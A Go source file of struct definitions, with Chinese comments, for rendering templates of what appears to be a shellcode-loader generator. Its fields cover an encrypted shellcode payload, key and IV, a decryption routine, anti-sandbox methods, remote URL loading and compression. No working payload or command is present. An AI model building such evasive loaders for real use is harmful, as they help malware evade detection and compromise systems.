package render

type TmplOpts struct {
	TmplFile     string      // 模板文件路径
	OutputDir    string      // 输出目录路径
	OutputGoName string      // 输出的 Go 文件名
	Data         interface{} // 基础模板渲染数据
}

type Data struct {
	KeyName     string      // key 变量名
	KeyValue    string      // key 值
	IvName      string      // iv  变量名
	IvValue     string      // iv  值
	CipherText  string      // 保存加密文本的变量名
	PlainText   string      // 保存解密文本的变量名
	Payload     string      // 加密 shellcode
	Decrypt     string      // 解密方法
	Loader      string      // loader
	EncryptData string      // 加密后的Payload文件
	SandBox     interface{} // 反沙箱模块
	Local       interface{} // 本地加载模块
	Remote      interface{} // 远程加载模块
	Args        interface{} // 参数加载模块
	Compressor  interface{} // 压缩算法模块
}

type SandBox struct {
	Import  string   // 导入库
	Methods []string // 反沙箱方法，可以一次渲染多个
}

type Compressor struct {
	Import    string // 导入库
	Algorithm string // 压缩算法
	Ratio     int    // lzw 压缩率
}

type Args struct {
	ArgsName  string // 参数加载的变量名
	ArgsValue string // 参数加载设置的密钥
}

type Remote struct {
	Url     string // 远程加载Url
	UrlName string // 远程加载变量名
	Method  string // 请求方法
}

type Load struct {
	Remote string
	Local  string
	Apart  string
}
